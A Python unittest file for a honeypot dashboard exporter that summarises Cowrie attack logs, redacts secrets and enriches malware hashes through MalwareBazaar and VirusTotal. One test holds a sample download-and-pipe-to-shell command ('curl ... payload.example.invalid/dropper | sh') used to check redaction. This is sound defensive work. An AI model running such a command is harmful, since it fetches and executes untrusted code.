import importlib.util
import io
import json
import copy
import tempfile
import unittest
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "export-dashboard.py"
FIXTURE = ROOT / "tests" / "fixtures" / "cowrie.json"

spec = importlib.util.spec_from_file_location("export_dashboard", SCRIPT)
export_dashboard = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(export_dashboard)


class DashboardExportTests(unittest.TestCase):
    def make_snapshot(self, cache_path=None, **kwargs):
        events, invalid = export_dashboard.load_events(FIXTURE)
        return export_dashboard.build_snapshot(
            events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
            "operational", cache_path, 0, public_endpoint="sensor.example.invalid", **kwargs,
        )

    def test_real_attacker_evidence_is_published_after_operator_exclusion(self):
        snapshot = self.make_snapshot()
        self.assertEqual(snapshot["schema_version"], "5.0")
        self.assertEqual(len(snapshot["five_minute"]), 288)
        self.assertEqual(len(snapshot["hourly"]), 168)
        self.assertEqual(snapshot["summary"]["sessions"], 2)
        self.assertEqual(snapshot["summary"]["unique_sources"], 2)
        self.assertEqual(snapshot["summary"]["auth_attempts"], 3)
        self.assertEqual(snapshot["summary"]["downloads"], 1)
        self.assertEqual(snapshot["data_quality"]["invalid_lines"], 1)
        self.assertEqual(snapshot["data_quality"]["operator_events_excluded"], 1)

        rendered = json.dumps(snapshot)
        self.assertIn("8.8.8.8", rendered)
        self.assertIn("1.1.1.1", rendered)
        self.assertIn("123456", rendered)
        self.assertIn("uname -a", rendered)
        self.assertIn("a6296a79f44e21b76604d2d2bbf795d2cf380f70e39d45fbf166707ff3b4a6a4", rendered)
        self.assertNotIn("9.9.9.9", rendered)
        self.assertNotIn("admin@example.com", rendered)
        self.assertNotIn("eyJaaaaaaaaaaaa", rendered)
        self.assertNotIn("token=secret", rendered)
        self.assertNotIn("fixture-one", rendered)
        self.assertNotIn("T1078", rendered)
        artifact = snapshot["artifacts"][0]
        self.assertEqual(artifact["correlation"]["status"], "unavailable")
        self.assertEqual(artifact["techniques"], ["T1105"])
        command = next(item for item in snapshot["commands"] if item["command"].startswith("curl"))
        self.assertEqual(command["techniques"], ["T1105", "T1059.004"])
        self.assertEqual(snapshot["sensor"]["public_endpoint"]["services"], [
            {"protocol": "SSH", "port": 22}, {"protocol": "TELNET", "port": 23},
        ])

    def test_geo_cache_enriches_sources_without_network_lookup(self):
        with tempfile.TemporaryDirectory() as directory:
            cache = Path(directory) / "geo.json"
            cache.write_text(json.dumps({"8.8.8.8": {
                "country": "United States", "country_code": "US", "city": "San Jose",
                "latitude": 37.3382, "longitude": -121.8863, "asn": 15169,
                "organization": "Example Network", "flag": "🇺🇸"
            }}), encoding="utf-8")
            snapshot = self.make_snapshot(cache)
            source = next(item for item in snapshot["sources"] if item["ip"] == "8.8.8.8")
            self.assertEqual(source["country_code"], "US")
            self.assertEqual(source["asn"], 15169)

    def test_navigator_layer_contains_observed_evidence(self):
        snapshot = self.make_snapshot()
        layer = export_dashboard.navigator_layer(snapshot)
        self.assertEqual(layer["domain"], "enterprise-attack")
        self.assertTrue(layer["techniques"])
        self.assertTrue(any(item["comment"] for item in layer["techniques"]))

    def test_single_credential_attempt_does_not_imply_password_guessing(self):
        events, _ = export_dashboard.load_events(FIXTURE)
        single_attempt = [
            event for event in events
            if event.get("src_ip") == "1.1.1.1" and event.get("eventid") == "cowrie.login.failed"
        ]
        snapshot = export_dashboard.build_snapshot(
            single_attempt, 0, set(), "greyfield-test", "test-region-1",
        )
        self.assertNotIn("T1110.001", {item["id"] for item in snapshot["mitre"]})

    def test_malwarebazaar_lookup_is_hash_only_and_cached_after_first_query(self):
        with tempfile.TemporaryDirectory() as directory:
            cache = Path(directory) / "enrichment-cache.json"
            auth_key = Path(directory) / "auth-key"
            auth_key.write_text("fixture-auth-key\n", encoding="utf-8")
            result = export_dashboard.provider_record(
                "MalwareBazaar", "correlated", "2026-09-01T12:30:00Z",
                label="FixtureFamily", report_url="https://bazaar.abuse.ch/sample/" + "a" * 64 + "/",
            )
            with mock.patch.object(export_dashboard, "lookup_malwarebazaar", return_value=(result, False)) as lookup:
                first = self.make_snapshot(
                    enrichment_cache_path=cache, enrichment_providers=["malwarebazaar"],
                    malwarebazaar_key_path=auth_key, provider_limit=3,
                )
                second = self.make_snapshot(
                    enrichment_cache_path=cache, enrichment_providers=["malwarebazaar"],
                    malwarebazaar_key_path=auth_key, provider_limit=3,
                )
            lookup.assert_called_once_with(
                "a6296a79f44e21b76604d2d2bbf795d2cf380f70e39d45fbf166707ff3b4a6a4",
                "fixture-auth-key",
            )
            self.assertEqual(first["artifacts"][0]["correlation"]["providers"], [result])
            self.assertEqual(second["artifacts"][0]["correlation"]["providers"], [result])
            cached = json.loads(cache.read_text(encoding="utf-8"))
            self.assertEqual(list(cached["entries"]), [first["artifacts"][0]["sha256"]])

    def test_invalid_hash_is_not_queried_or_published_as_sha256(self):
        events, invalid = export_dashboard.load_events(FIXTURE)
        download = next(event for event in events if event.get("eventid") == "cowrie.session.file_download")
        download["shasum"] = "not-a-sha256"
        with mock.patch.object(export_dashboard, "lookup_malwarebazaar") as lookup:
            snapshot = export_dashboard.build_snapshot(
                events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
                enrichment_providers=["malwarebazaar"],
            )
        lookup.assert_not_called()
        self.assertIsNone(snapshot["artifacts"][0]["sha256"])
        self.assertEqual(snapshot["artifacts"][0]["correlation"]["status"], "unavailable")

    def test_embedded_url_credentials_and_query_are_removed(self):
        cleaned, redactions = export_dashboard.clean_evidence(
            "curl https://operator:secret@payload.example.invalid/dropper?token=value | sh"
        )
        self.assertEqual(cleaned, "curl https://payload.example.invalid/dropper | sh")
        self.assertGreaterEqual(redactions, 1)

    def test_malformed_download_url_is_withheld_without_blocking_snapshot(self):
        events, invalid = export_dashboard.load_events(FIXTURE)
        download = next(event for event in events if event.get("eventid") == "cowrie.session.file_download")
        download["url"] = "payload.example.invalid/dropper"
        snapshot = export_dashboard.build_snapshot(
            events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
        )
        self.assertIsNone(snapshot["artifacts"][0]["url"])
        self.assertIn(
            "Malformed transfer reference withheld",
            [item["value"] for item in next(item for item in snapshot["mitre"] if item["id"] == "T1105")["evidence"]],
        )
        self.assertIn(
            "Malformed transfer reference withheld",
            [item["detail"] for item in snapshot["recent"]],
        )

    def test_long_command_is_bounded_and_marked_truncated(self):
        events, invalid = export_dashboard.load_events(FIXTURE)
        command = next(event for event in events if event.get("eventid") == "cowrie.command.input")
        command["input"] = "uname " + "x" * 3000
        snapshot = export_dashboard.build_snapshot(
            events, invalid, {"9.9.9.9"}, "greyfield-test", "test-region-1",
        )
        published = next(item for item in snapshot["commands"] if item["command"].startswith("uname"))
        self.assertEqual(len(published["command"]), export_dashboard.COMMAND_LIMIT)
        self.assertTrue(published["truncated"])

    def test_virustotal_transient_failure_is_backed_off_not_cached_as_evidence(self):
        with tempfile.TemporaryDirectory() as directory:
            cache = Path(directory) / "enrichment-cache.json"
            key = Path(directory) / "vt-key"
            key.write_text("fixture-vt-key\n", encoding="utf-8")
            unavailable = export_dashboard.provider_record(
                "VirusTotal", "unavailable", "2026-09-01T12:30:00Z",
            )
            with mock.patch.object(export_dashboard, "lookup_virustotal", return_value=(unavailable, True)) as lookup:
                first = self.make_snapshot(
                    enrichment_cache_path=cache, enrichment_providers=["virustotal"],
                    virustotal_key_path=key, provider_limit=3,
                )
                second = self.make_snapshot(
                    enrichment_cache_path=cache, enrichment_providers=["virustotal"],
                    virustotal_key_path=key, provider_limit=3,
                )
            lookup.assert_called_once()
            self.assertEqual(first["artifacts"][0]["correlation"]["status"], "unavailable")
            self.assertEqual(second["artifacts"][0]["correlation"]["providers"], [])

    def test_virustotal_normalizes_existing_hash_report_without_file_submission(self):
        sha256 = "b" * 64
        response = io.BytesIO(json.dumps({"data": {"attributes": {
            "last_analysis_stats": {"malicious": 7, "suspicious": 2, "harmless": 3, "undetected": 58},
            "popular_threat_classification": {"suggested_threat_label": "Fixture.Loader"},
            "tags": ["elf", "linux"],
        }}}).encode())
        with mock.patch.object(export_dashboard.urllib.request, "urlopen", return_value=response) as request:
            result, transient = export_dashboard.lookup_virustotal(sha256, "fixture-key")
        outbound = request.call_args.args[0]
        self.assertEqual(outbound.full_url, export_dashboard.VIRUSTOTAL_URL + sha256)
        self.assertEqual(outbound.get_method(), "GET")
        self.assertIsNone(outbound.data)
        self.assertFalse(transient)
        self.assertEqual(result["status"], "correlated")
        self.assertEqual(result["label"], "Fixture.Loader")
        self.assertEqual(result["malicious"], 7)
        self.assertEqual(result["tags"], ["elf", "linux"])

    def test_provider_quota_limits_new_virustotal_hashes_and_spaces_calls(self):
        with tempfile.TemporaryDirectory() as directory:
            cache = Path(directory) / "enrichment-cache.json"
            key = Path(directory) / "vt-key"
            key.write_text("fixture-vt-key\n", encoding="utf-8")
            hashes = [f"{index:064x}" for index in range(5)]
            result = export_dashboard.provider_record("VirusTotal", "not-found", "2026-09-01T12:30:00Z")
            with mock.patch.object(export_dashboard, "lookup_virustotal", return_value=(result, False)) as lookup, mock.patch.object(export_dashboard.time, "sleep") as pause:
                mapped, lookups, failures = export_dashboard.enrich_hashes(
                    hashes, cache, ["virustotal"], None, key, 3,
                )
            self.assertEqual(lookup.call_count, 3)
            self.assertEqual(pause.call_count, 2)
            self.assertEqual(lookups, 3)
            self.assertEqual(failures, 0)
            self.assertEqual(len(mapped), 5)

    def test_schema_five_publication_ceilings_are_explicit(self):
        events = []
        for index in range(501):
            address = f"11.{index // 256}.{index % 256}.1"
            session = f"session-{index}"
            timestamp = f"2026-09-01T12:{index % 60:02d}:00Z"
            events.extend([
                {"eventid": "cowrie.session.connect", "timestamp": timestamp, "src_ip": address, "session": session, "protocol": "ssh"},
                {"eventid": "cowrie.login.failed", "timestamp": timestamp, "src_ip": address, "session": session, "username": f"user-{index}", "password": f"pass-{index}"},
                {"eventid": "cowrie.command.input", "timestamp": timestamp, "src_ip": address, "session": session, "input": f"echo fixture-{index}"},
                {"eventid": "cowrie.session.file_download", "timestamp": timestamp, "src_ip": address, "session": session, "url": f"http://11.200.{index // 256}.{index % 256}/sample-{index}", "shasum": f"{index:064x}"},
            ])
        snapshot = export_dashboard.build_snapshot(events, 0, set(), "greyfield-test", "test-region-1")
        self.assertEqual(len(snapshot["sources"]), 500)
        self.assertEqual(len(snapshot["credentials"]["usernames"]), 250)
        self.assertEqual(len(snapshot["credentials"]["passwords"]), 250)
        self.assertEqual(len(snapshot["commands"]), 500)
        self.assertEqual(len(snapshot["artifacts"]), 250)
        self.assertTrue(all(snapshot["coverage"][key]["truncated"] for key in ("sources", "usernames", "passwords", "commands", "artifacts")))
        shell = next(item for item in snapshot["mitre"] if item["id"] == "T1059.004")
        transfer = next(item for item in snapshot["mitre"] if item["id"] == "T1105")
        self.assertEqual(len(shell["evidence"]), 25)
        self.assertEqual(len(transfer["evidence"]), 25)

    def test_five_minute_timeline_uses_event_timestamps(self):
        events = [
            {"eventid": "cowrie.session.connect", "timestamp": "2026-09-01T12:01:00Z"},
            {"eventid": "cowrie.session.connect", "timestamp": "2026-09-01T12:04:59Z"},
            {"eventid": "cowrie.login.failed", "timestamp": "2026-09-01T12:05:00Z"},
        ]
        rows = export_dashboard.build_five_minute(
            events, export_dashboard.parse_timestamp("2026-09-01T12:09:00Z"),
        )
        self.assertEqual(rows[-2]["bucket"], "2026-09-01T12:00:00Z")
        self.assertEqual(rows[-2]["sessions"], 2)
        self.assertEqual(rows[-1]["bucket"], "2026-09-01T12:05:00Z")
        self.assertEqual(rows[-1]["auth"], 1)

    def test_schema_four_baseline_is_carried_into_schema_five_without_fabricated_five_minute_data(self):
        baseline = self.make_snapshot()
        baseline["schema_version"] = "4.0"
        baseline.pop("five_minute")
        baseline["sensor"]["name"] = "retired-sensor"
        baseline["sensor"]["public_endpoint"]["host"] = "old.example.invalid"
        current = self.make_snapshot()
        current_five_minute = copy.deepcopy(current["five_minute"])

        merged = export_dashboard.merge_baseline(current, baseline, {"9.9.9.9"})

        self.assertEqual(merged["schema_version"], "5.0")
        self.assertEqual(merged["sensor"]["name"], "greyfield-test")
        self.assertEqual(merged["sensor"]["public_endpoint"]["host"], "sensor.example.invalid")
        self.assertEqual(merged["summary"]["sessions"], 4)
        self.assertEqual(merged["summary"]["unique_sources"], 2)
        self.assertEqual(len(merged["five_minute"]), 288)
        self.assertEqual(merged["five_minute"], current_five_minute)
        self.assertIn("historical evidence", merged["provenance"]["collection"].lower())
        self.assertIn("current-sensor timestamps", merged["provenance"]["interpretation"])

    def test_baseline_with_denied_operator_source_fails_closed(self):
        baseline = self.make_snapshot()
        baseline["schema_version"] = "4.0"
        baseline.pop("five_minute")
        baseline["sources"][0]["ip"] = "9.9.9.9"
        with self.assertRaisesRegex(ValueError, "denied operator IP"):
            export_dashboard.merge_baseline(self.make_snapshot(), baseline, {"9.9.9.9"})

    def test_load_baseline_rejects_unsupported_schema(self):
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "baseline.json"
            path.write_text('{"schema_version":"2.0"}', encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "schema 4.0 or 5.0"):
                export_dashboard.load_baseline(path)


if __name__ == "__main__":
    unittest.main()
